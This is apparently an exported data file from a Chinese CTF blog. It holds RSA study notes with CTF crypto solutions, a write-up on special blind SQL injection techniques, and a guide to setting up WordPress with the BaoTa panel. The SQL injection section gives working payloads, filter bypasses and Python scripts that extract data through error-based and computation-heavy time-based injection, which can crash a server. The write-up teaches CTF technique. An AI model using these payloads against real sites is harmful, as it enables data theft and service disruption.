4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194 n = p*q phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) flag&#123;b4by_R5A&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://flag2020.top/tags/crypto/"}]},{"title":"学习笔记——RSA","slug":"学习笔记——RSA","date":"2021-02-14T16:00:00.000Z","updated":"2021-04-09T15:19:40.542Z","comments":true,"path":"posts/20210215.html","link":"20210215","permalink":"https://flag2020.top/posts/20210215.html","excerpt":"RSA算法学习笔记 &amp; 3道crypto题目","text":"RSA算法学习笔记 &amp; 3道crypto题目 前言RSA算法（RSA algorithm）是1977年由Ron Rivest、Adi Shamir和Leonard Adleman一起提出的，RSA就是他们三人姓氏开头字母拼在一起组成的。 RSA算法首先生成两把密钥（公钥和私钥），公钥对外公布，私钥由用户自己保管。信息传输过程大致如：A利用RSA算法生成两把密钥后，将公钥公开、私钥自己保管，B用公钥加密信息生成密文，A再用私钥对密文进行解密。 数学基础质数 &amp; 互质 质数：除了1和它本身之外不再有其它因数的自然数。 互质：公因数只有1的两个自然数称为互质自然数，即这两个自然数互质。 像4和5两个自然数，它们的公因数只有1，所以4和5互质。 而6和8的公因数除了1之外还有2，所以它们不是互质自然数。 而5和5的公因数有1和5，所以也不是互质自然数。 两个不同的质数一定是互质数。 相邻的两个自然数是互质数。 较大数是质数的两个数是互质数。 欧拉函数定义欧拉函数（Euler’s totient function）是指对于对于正整数n，小于或等于n的正整数中与n互质的数的个数。 比如对于φ(6)，小于或等于6的正整数有1、2、3、4、5、6，其中与6互质的有1、5，所以φ(6) = 2 性质 对于一个质数n，φ(n) = n-1 即对于质数7，φ(7) = 7-1 = 6 对于一个数，如果能分解为两个互质的数，即n=p*q，那么φ(n) = φ(p*q) = φ(p) * φ(q) 即对于数20，φ(20) = φ(4*5) = φ(4) * φ(5) 由两个性质可得：对于一个数n，如果能够分解为两个互质的质数(p和q)，那么φ(n) = φ(p*q) = φ(p) * φ(q) = (p-1) * (q-1) 所以φ(35) = φ(5*7) = φ(5) * φ(7) = (5-1) * (7-1) = 4*6 = 24 欧拉定理对于两个互质的正整数m和n，有$$m^{\\varphi(n)} \\equiv 1\\pmod{n}$$也就是说，m的φ(n)次方除以n的余数为1。 在这里我们对它做一些变化，先两边同时乘以一个任意的正整数幂k，可得：$$(m^{\\varphi(n)})^k \\equiv 1^k\\pmod{n}$$ $$m^{k\\varphi(n)} \\equiv 1\\pmod{n}$$ 两边再同时乘以正整数m，可得：$$m^{k\\varphi(n)} * m \\equiv 1*m \\pmod{n}$$ $$m^{k\\varphi(n)+1} \\equiv m \\pmod{n}$$ $$m^{k\\varphi(n)+1} \\mod{n} \\equiv m$$ 模反元素如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a对模数n的模反元素。$$ab \\equiv 1 \\pmod{n}$$代入定义来理解：对于两个互质的正整数a=3和n=11，存在一个数b=4，使得3*4除以11的余数为1。 显然b不只有1个，可以有很多个，即存在一个整数k，使得a*kb mod n = 1，即：3*k*4 mod 11 = 1，或3*4-1 = kφ(n)。 编程基础gmpy2gmpy2是一个Python扩展模块，是对GMP (Multiple Precision Arithmetic Library，即GNU高精度算术运算库) 的封装。 安装gmpy2之前需要提前安装python3环境。 先检查一下是否安装wheel文件包，没有的话就安装下pip install wheel。 下载对应python版本的whl文件，然后pip install [文件的路径] 常用函数 gmpy2.mpz(n) 初始化一个大整数 gmpy2.invert(x, y) 求x对于y的逆元z，x*z = 1 (mod y) gmpy2.is_prime(n) 判断n是否为质数 gmpy2.gcd(x, y) 求x和y的最大公因数 gmpy2.powmod(x, y, z) 对x的y次方除以z求余 P.s. python自带一个pow()函数 pow(x, y[, z]) 计算 x 的 y 次方，如果 z 在存在，则再对结果进行取模，其结果等效于 pow(x,y) %z libnum安装：pip install libnum Converting s2n(s) - packed string to number n2s(n) - number to packed string s2b(s) - packed string to binary string b2s(b) - binary string to packed string 其它函数可以看GitHub项目里的说明：https://github.com/hellman/libnum RSA算法在这里先确定一些字母的意思 m：信息(message)，原始数据，明文，也就是要加密的内容 e：加密(encrypt)，用于加密信息 c：密文(cipher)，加密后的信息 d：解密(decrypt)，用于解密密文 n：模数(modulus)，由两个互质的质数p和q相乘所得 生成密钥 取两个不相等的质数p和q（p和q越大越难被破解），则n = p * q 计算φ(n) = φ(p*q) = φ(p) * φ(q) = (p-1) * (q-1) 随机选取一个整数e，通常为65537 计算e对于φ(n)的模反元素d (d的计算在下面说明) 由此便可生成公钥和私钥： 公钥：(n, e) 私钥：(n, d) 加密与解密加密：$$m^e \\mod {n} = c$$解密：$$c^d \\mod {n} = m$$即： c &#x3D; pow(m, e, n) m &#x3D; pow(c, d, n) 对于加密公式，两边同时乘以一个正整数幂d，即：$$m^{ed} \\mod {n} = c^d$$再对n取模，可得：$$(m^{ed} \\mod{n}) \\mod{n} = c^d \\mod{n}$$ $$m^{ed} \\mod{n} = m$$ 在上面我们由欧拉定理得到：$$m^{k\\varphi(n)+1} \\mod{n} \\equiv m$$由这两个公式可得：$$ed = k\\varphi(n)+1$$ $$d = \\frac {k\\varphi(n)+1} {e}$$ 如果直接从模反元素的定义出发，我们也可以得到$$ed \\equiv 1 \\pmod{ \\varphi(n) }$$即存在整数k，使得$$ed-1 = k\\varphi(n)$$ $$d = \\frac {k\\varphi(n)+1} {e}$$ 例子乙同学利用RSA与甲同学进行加密通信，首先乙同学得生成两把密钥（公钥和私钥） 假设他任意选取两个不相等的质数p=41、q=43，计算可得φ(1763) = φ(4143) = (41-1)*(43-1) = 1680。(注意：*m必须小于n) 然后再随机选取一个整数e（注意：由模反元素的定义，φ(n)和e互质），这里选择e=65537。(较大数是质数的两个数互质) 由此计算d = (k*1680+1)/65537，解得其中一个解为 (d, k) = (593, 23133) ，所以d=593。 &lt;?php for ($k=2; $k &lt; 30000; $k++) &#123; $d = ($k*1680+1)/65537; if(is_int($d)) &#123; echo \"(d, k) = (\".$d.\", \".$k.\")\"; &#125; &#125; 于是乙同学对外公布了公钥 (n, e) = (1763, 65537)，自己保存私钥 (n, d) = (1763, 593)。 甲同学拿到公钥后想向乙同学发个字母f，由于RSA算法只能加密整数，所以用字母f的ASCII码 102。 加密过程：c = pow(m, e, n) = pow(102, 65537, 1763) =2，于是发给甲同学484。 甲同学拿到后，利用手中的私钥进行解密，即m = pow(c, d, n) = pow(484, 593, 1763) = 102。 由此可以得知甲同学发过来的是字母f。 [HECTF2020]rsan &#x3D; 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423 e &#x3D; 65537 c &#x3D; 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820 可以利用这个网站尝试分解n：http://factordb.com/ 分解得到： p &#x3D; 2499568793 q &#x3D; 4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911 已知p和q，可以计算φ(n)，即phi，然后求出私钥d，再用私钥解密密文c就可以得到原始数据m，最后将m转为字符串输出即可。 import gmpy2 import libnum n = 11419768903339716189261532371559705252086398275876008505047375123074727093589680611869748263351554093957968142343831331654606932684767042958427409579115435445187908134556329979271179879129295667476493886787230948520371350715808988496083694717544298343260369816980228394498856751096191942011545898984240281874509791880690092840536597771674772617299407710771426964764347566008897012753022763270832647775571317162594044338095870404550665457899223394942640876850692848671826594750236910363027949459768124646230555766323417693441861436560072288812137944884954974348317322412816157152702695143094487806945533233359294549423 e = 65537 c = 575061710950381118206735073806398116370706587076775765253483131078316908073202143802386128272374323616239083134747318254436706806781744501903333604772961927966747648954315962269321297121495398057938617145017999482722197661065698707836824505023856306403892307944203245563411961302499347604417024064678999003637933185177922884103362203639349298263339808508185861692596967147081382566246627668898774233029198694500565511361867375668367875805985660705137109665107860799277624050210666866958502948062330037309873148963011192405012811945540153592090345668265964477204465327474208098404082920129178960510763496025906621820 p = 2499568793 q = 4568695582742345507136251229217400959960856046691733722988345503429689799935696593516299458516865110324638359470761456115925725067558499862591063153473862179550706262380644940013531317571260647226561004191266100720745936563550699000939117068559232225644277283541933064331891245169739139886735615435506152070330233107807124410892978280063993668726927377177983100529270996547002022341628251905780873531481682713820809147098305289391835297208890779643623465917824350382592808578978330348769060448006691307027594085634520759293965723855183484366752511654099121387261343686017189426761536281948007104498017003911 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125; [GUET-CTF2019]BabyRSAp+q : 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea (p+1)(q+1) : 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 e : 0xe6b1bee47bd63f615c7d0a43c529d219 d : 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5 enc_flag : 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a 已知c和d，只需要知道n即可，而n = p*q = (p+1)*(q-1) - (p+q) - 1 import gmpy2 import libnum a = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea b = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 e = 0xe6b1bee47bd63f615c7d0a43c529d219 d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5 c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a n = b-a-1 m = pow(c, d, n) print(libnum.n2s(int(m))) [BJDCTF2020]RSAfrom Crypto.Util.number import getPrime,bytes_to_long flag=open(\"flag\",\"rb\").read() p=getPrime(1024) q=getPrime(1024) assert(e&lt;100000) n=p*q m=bytes_to_long(flag) c=pow(m,e,n) print c,n print pow(294,e,n) p=getPrime(1024) n=p*q m=bytes_to_long(\"BJD\"*32) c=pow(m,e,n) print c,n ''' output: 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 ''' 在这道题中，两个n公用一个q，所以我们可以通过gmpy2.gcd(x, y)求出q，由此可以求出两个p的值，进而求出第一个n的φ(n)。 然而只知道e小于100000，不知道e的值还无法求d = gmpy2.invert(e, phi)。 但我们可以利用print pow(294, e, n)去爆破e，这样我们就可以解密m = pow(c, d, n) import gmpy2 import libnum n1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037 n2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047 q = gmpy2.gcd(n1, n2) p = n1//q phi = (p-1)*(q-1) pow_294_e_n1 = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018 for i in range(100000): if (pow(294, i, n1) == pow_294_e_n1): e = i break c = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120 d = gmpy2.invert(e, phi) m = pow(c, d, n1) print(libnum.n2s(int(m))) BJD&#123;p_is_common_divisor&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://flag2020.top/tags/crypto/"}]},{"title":"两种CTF中特殊盲注的总结","slug":"两种CTF中特殊盲注的总结","date":"2021-02-03T16:00:00.000Z","updated":"2021-04-09T15:06:31.636Z","comments":true,"path":"posts/20210204.html","link":"20210204","permalink":"https://flag2020.top/posts/20210204.html","excerpt":"文章首发合天：两种CTF中特殊盲注的总结","text":"文章首发合天：两种CTF中特殊盲注的总结 Blind SQL（盲注）是SQL注入攻击的其中一种。在sql注入过程中，sql语句执行后数据不会回显到前端页面，此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。 SQL盲注基本知识常用基本函数 IF(expr1,expr2,expr3) 若expr1为true，则返回expr2，为false则返回expr3 SELECT IF(TRUE, &#39;A&#39;,&#39;B&#39;) -- 输出结果：A SELECT IF(FALSE,&#39;A&#39;,&#39;B&#39;) -- 输出结果：B ASCII(str) 返回字符串str最左面字符的ASCII值 SELECT ASCII(&quot;flag&quot;) -- 输出结果：102 ORD(str) 返回字符串str第一个字符的ASCII值 SELECT ORD(&quot;flag&quot;) -- 输出结果：102 CHAR(int) 将ASCII码值int转换成字符 SELECT CHAR(65) -- 输出结果：A MID(str,pos,len) 从pos位置开始，截取字符串str共len个长度的字符 SELECT MID(&quot;Hello World&quot;, 3, 5) -- 输出结果：llo W 与SUBSTR(str,pos,len) 效果相同 LEFT(str,len) 返回字符串str左边部分共len个字符 SELECT LEFT(&quot;flag&quot;, 2) -- 输出结果：fl SLEEP(duration) duration是休眠的时长，以秒为单位，也可以是小数 SELECT SLEEP(3) # [SQL] SELECT SLEEP(3) # 受影响的行: 0 # 时间: 3.005ms REGEXP 正则表达式，用来匹配文本的特殊的串（字符集合） SELECT &quot;FLAG&quot; REGEXP &quot;LA&quot; -- 输出结果：1 SELECT &quot;FLAG&quot; REGEXP &quot;[0-9]&quot; -- 输出结果：0 其它 LENGTH(str) -- 返回字符串str的长度 DATABASE() -- 返回当前数据库名 VERSION() -- 返回当前MySQL版本 布尔盲注根据注入点的输入，页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。 SELECT IF(LENGTH(DATABASE())&gt;3, 1, 2) -- 输出结果：1 SELECT IF(LENGTH(DATABASE())&gt;4, 1, 2) -- 输出结果：2 据此可知数据库名的长度为4 时间盲注通过执行时间的长短来判断是否执行成功，也就是时间延迟注入。 SELECT IF(MID(DATABASE(),1,1)&#x3D;&#39;c&#39;, SLEEP(3), 2) -- 3秒后才响应 SELECT IF(MID(DATABASE(),1,1)&#x3D;&#39;a&#39;, SLEEP(3), 2) -- 立即响应 据此可知数据库名的第一个字符为c 以下2道题目：flag在flag表的flag字段 在本地搭建靶机，用post传参，变量keywords接收 基于运行错误的布尔盲注基于运行错误的布尔盲注即能够通过sql语句的语法、语义分析，但运行时报错。 我们可以将其作为IF(expr1,expr2,expr3)的expr3，当expr1为true时，返回expr2，页面正常，而为false时，则会执行expr3，此时因为运行错误而页面无法正常显示。 ST_GeomFromText(character-string[, srid]) 是根据字符串表示构造几何的方法，即： SELECT ST_GeomFromText( &#39;LineString( 1 2, 5 7 )&#39;, 4326 ) -- 输出结果：[0102000020E610000002000000000000000000F03F000000000000004000000000000014400000000000001C40] ST_X(point)：该方法是获取点的x坐标，它操作的对象是一个点，即： SELECT ST_X(POINT(2,3)) -- 输出结果：2 但当操作对象不是点时，运行会报错，却能够通过sql的检查，所以可以用来构造true和false两种情况下出现不同的页面 SELECT IF(1, 1, ST_X(ST_GeomFromText(&#39;POINT(aaa)&#39;))) -- 输出结果：1 SELECT IF(0, 1, ST_X(ST_GeomFromText(&#39;POINT(aaa)&#39;))) -- ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext. P.s. ST_GeomFromText 、 ST_MPointFromText 是两个可以从文本中解析Spatial function的函数。 需要注意的是 ST_GeomFromText 针对的是 POINT() 函 数， ST_MPointFromText 针对的是 MULTIPOINT() 函数的。 其他可用的函数： SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0); SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0); SELECT IF(&#123;&#125;, ST_X(MADS), 0); SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MADS&#39;),0); SELECT IF(&#123;&#125;, ST_GeomFromText(&#39;MADS&#39;),0); 如果题目过滤了ST，可以尝试用GeomFromText()和X()，但MySQL在5.7.6版本之后就弃用了。 Name Description X() (deprecated 5.7.6) Return X coordinate of Point GeomFromText()(deprecated 5.7.6) Return geometry from WKT 当输入1、2、3等数字时，页面返回Hello World 而当输入被过滤的关键字时，网页返回No Hacker 由此可以测试一些被过滤的关键字有： &#39;、&quot;、or、-、*、&gt;、&lt;、=、like、sleep、substr、mid、ascii、ord 然而在不被ban掉的情况下，网页只能返回一种页面，无法进行平常的数字型盲注。 而像if(0,1e9999,1)，因为无法通过sql语句的检查，所以页面无法正常显示，更别说if(1,1e9999,1)了。 此时可以考虑用基于运行错误的布尔盲注，语法、语义上能够通过sql的检查，但如果执行到该语句却会运行错误，这样便能够构造true和false两种情况了。 用if来进行盲注，&#39;被过滤了，用十六进制绕过。 if(1,1,ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)) &gt; if(1,1,ST_X(ST_GeomFromText(0x504F494E54286D61647329)) 此时页面返回Hello World。题目说flag在flag表的flag字段，用left()截取第一个字符进行判断，=和like可以用regexp代替。 构造payload： if(left((select flag from flag),1) regexp char(102),1,ST_X(ST_GeomFromText(0x504F494E54286D61647329))) 此时页面仍然返回Hello World，可以知道flag的第一个字符是char(102)，也就是f if(left((select flag from flag),2) regexp char(102,108),1,ST_X(ST_GeomFromText(0x504F494E54286D61647329))) 而第二个字符是char(108)，也就是字符l 用python写个脚本 import requests def fun(string): result = \"\" j = 1 for i in string: if j != len(string): result = result + str(ord(i)) + \",\" else: result = result + str(ord(i)) j += 1 return \"char(\" + result + \")\" url = \"http://sqlblind.com/index.php\" tables = \"abcdefghijklmnopqrstuvwxyz0123456789-_&#125;&#123;\" flag = \"\" for i in range(1, 50): for j in tables: if j == \"&#123;\" or j == \"&#125;\": j = \"\\\\\" + j payload = \"if(left((select flag from flag),%s) regexp %s,1,ST_X(ST_GeomFromText(0x504F494E54286D61647329)))\" % ( i, fun(flag+j)) r = requests.post(url=url, data=&#123;'keywords': payload&#125;) if \"Hello World\" in r.text: flag = flag + j print(flag.replace(\"\\\\\", \"\")) break 基于巨大运算时间的时间盲注由于在这里过滤了ST，所以以ST开头的函数会被ban，无法使用。 同时又过滤了sleep，所以无法通过时间休眠来延迟时间，也就没法用sleep来进行时间盲注。 但我们可以通过sql语句来执行一个运算时间很长很长的语句，以此来作为时间延迟，也就是说用if来判断flag的字符，如果正确则执行一个需要很长运算时间的语句，否则返回0。 所以之后用python写脚本的时候，设定一个超时时间，在设定时间内没有返回内容即字符正确，这样便能进行时间盲注了。 在此之前先了解几个函数 rpad(str,len,padstr) 对字符串str进行右填充，用padstr填充至str长度为len个字符 SELECT RPAD(&#39;hi&#39;, 5, &#39;?&#39;) -- 输出结果：hi??? concat(str1,str2,…) 连接多个字符串为一个字符串 SELECT CONCAT(&#39;he&#39;, &#39;ll&#39;, &#39;o&#39;) -- 输出结果：hello repeat(str,count) 返回字符串str重复count次后的字符串 SELECT REPEAT(&#39;ab&#39;, &#39;3&#39;) -- 输出结果：ababab 构造payload： 1 and if((select flag from flag) regexp binary &#39;f&#39;,rpad(&#39;a&#39;,5000000,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;),0) 也就是说如果flag的第一个字符为f的话，则会执行下面这句语句： rpad(&#39;a&#39;,5000000,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;) rpad(&#39;a&#39;,5000000,&#39;a&#39;)会填充为5000000个a，会构造成一个很长的字符串，与字符串concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)去作正则匹配，通过巨大的运算量来延时。 这样做的话服务器可能会崩 由于题目过滤了&#39;，所以用十六进制代替 1 and if((select flag from flag) regexp binary 0x66,rpad(0x61,5000000,0x61) regexp concat(repeat(0x28612E2A292B,30),0x62),0) 以下两种图片用get传参测试时间延迟效果 猜中flag的第一个字符时： 而如果猜第一个字符为0x01，则为false，if返回0 所以我们可以通过大量的运算时间做延迟，进行时间盲注。 但服务器进程在接到客户端传送过来的SQL语句时，不会直接去数据库查询。服务器进程把这个SQL语句的字符转化为ASCII等效数字码，接着这个ASCII码被传递给一个HASH函数，并返回一个hash值，然后服务器进程将到shared pool中的library cache（高速缓存）中去查找是否存在相同的hash值。如果存在，服务器进程将使用这条语句已高速缓存在SHARED POOL的library cache中的已分析过的版本来执行，省去后续的解析工作，这便是软解析。 所以多次查询rpad(&#39;a&#39;,5000000,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)后将不再延迟，所以对rpad()的5000000需要每次自减1 脚本来自Gqleung(http://www.plasf.cn) import requests def ord2hex(string): result = \"\" for i in string: r = hex(ord(i)) r = r.replace('0x', '') result = result+r return '0x'+result url = \"http://sqlblind.com/index.php\" tables = \"abcdefghijklmnopqrstuvwxyz0123456789-_&#125;&#123;\" result = \"\" for i in range(1, 50): for j in tables: if j == \"&#123;\" or j == \"&#125;\": j = '\\\\'+j payload = \"1 and if((select flag from flag) regexp binary %s,rpad(0x61,%d,0x61) regexp concat(repeat(0x28612E2A292B,30),0x62),0)\" % ( ord2hex(\"^\"+result+j), 5000000-i) try: r = requests.post(url=url, data=&#123;'keywords': payload&#125;, timeout=3) except Exception as e: result = result+j print(result.replace('\\\\', '')) timeout：设定超时时间，秒为单位在设定时间内没有返回内容则返回一个timeout异常 若是3秒内没有返回内容则返回timeout异常，即字符正确，打印输出","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"在云服务器上搭建博客","slug":"在云服务器上搭建博客","date":"2020-12-22T16:00:00.000Z","updated":"2021-04-09T14:00:54.110Z","comments":true,"path":"posts/20201223.html","link":"20201223","permalink":"https://flag2020.top/posts/20201223.html","excerpt":"宝塔 + WordPress","text":"宝塔 + WordPress 电脑系统：win10 阿里云服务器系统镜像：CentOS 7.6 FinalShell版本：3.6.3 连接云服务器用FinalShell连接云服务器（云服务器已实例） 点击SSH连接(Linux) 名称随意，主机填云服务器的公网IP，用户名填root，密码填云服务器实例密码，点击确定 然后双击即可连接 安装宝塔Linux面板宝塔Linux面板安装教程 - 2020年12月2日更新 - 7.4.6正式版 由于系统是CentOS的，复制CentOS安装指令 yum install -y wget &amp;&amp; wget -O install.sh http:&#x2F;&#x2F;download.bt.cn&#x2F;install&#x2F;install_6.0.sh &amp;&amp; sh install.sh 提示是否安装宝塔面板，输入 y Do you want to install Bt-Panel to the &#x2F;www directory now?(y&#x2F;n):y 安装完成后记录下外网面板地址以及username和password 开通对应端口点击左侧的实例，点击对应的服务器 点击左侧的本实例安全组，点击配置规则 点击快速创建规则，开通8888以及常用端口 创建站点访问外网面板地址，账号输入username，密码输入password 点击左边的LNMP(推荐)的一键安装 安装完成后添加站点 域名可以用IP代替，根目录自己定义，添加MySQL数据库 点击提交即可 安装WordPress安装WordPress官网：https://cn.wordpress.org/download/ 下载WordPress后上传到宝塔Linux面板 解压到blog目录下 直接解压的话是解压到wordpress文件夹里，复制粘贴到blog目录下即可 访问域名进行安装，点击现在就开始！ 数据库名和用户名都是之前生成的数据库名，密码为数据库密码 可在宝塔Linux面板点击左侧的数据库查看 输入完成后点击提交 填写信息页面，站点标题随意，用户名和密码自己设置，电子邮件写自己的邮箱 点击安装WordPress，重新输入账号密码登录 此时进入的是WordPress的后台，可以在后台进行博客主题等相关设置 